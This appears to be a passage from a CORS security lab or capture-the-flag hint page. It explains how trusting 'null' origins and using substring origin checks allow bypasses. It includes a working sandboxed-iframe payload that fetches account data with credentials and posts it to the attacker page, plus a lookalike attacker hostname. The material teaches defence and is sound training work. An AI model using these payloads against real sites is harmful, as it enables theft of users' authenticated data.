🔎 Allowlist Inspection

Attack Vector 1 — The null Origin

Browsers send Origin: null from sandboxed iframes, data URIs, and some redirects. The server explicitly trusts this string. Any attacker page can wrap their exploit in a sandboxed iframe to trigger it:

<!-- attacker page wraps fetch in a sandboxed iframe --> <iframe sandbox="allow-scripts" srcdoc="<script>fetch('http://localhost:3000/api/x2/account',{credentials:'include'}).then(r=>r.json()).then(d=>parent.postMessage(d,'*'))</script>"> </iframe> // Browser sends: Origin: null // Server check: origin === 'null' → true → allows it

Attack Vector 2 — Substring Matching

origin.includes('localhost:3000') matches any string containing that substring. A hostname like evillocalhost:3000.attacker.com would pass this check. Always use exact equality or anchored regex:

// Vulnerable — substring match origin.includes('localhost:3000') → passes for: "http://evillocalhost:3000.attacker.com" // Safe — exact match from an allowlist const ALLOWED = ['http://localhost:3000', 'https://app.example.com']; ALLOWED.includes(origin) ← exact equality, no bypass

#2 The null origin source
A sandboxed iframe (<iframe sandbox="allow-scripts" srcdoc="...">) causes the browser to send Origin: null for requests made inside it. The server trusts null.

In attacker/public/x2.html, wrap your fetch inside a sandboxed iframe's srcdoc. The browser sends Origin: null → the server's origin === 'null' check passes → you read the flag. Use parent.postMessage() to send it back.
